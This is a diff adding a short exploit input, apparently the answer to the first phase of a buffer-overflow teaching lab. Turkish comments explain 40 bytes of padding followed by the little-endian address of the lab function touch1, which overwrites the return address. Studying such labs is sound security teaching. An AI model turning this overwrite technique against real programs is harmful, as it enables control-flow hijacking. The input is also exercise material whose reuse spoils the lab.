@@ -1,0 +1,4 @@
+//Bufferımızın boyutu 0x28, 40 bayttır. 40 baytlık boş veri ile dolduruyoruz.
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+//Ardından touch1 in adresi
+3f 18 40 00 00 00 00 00
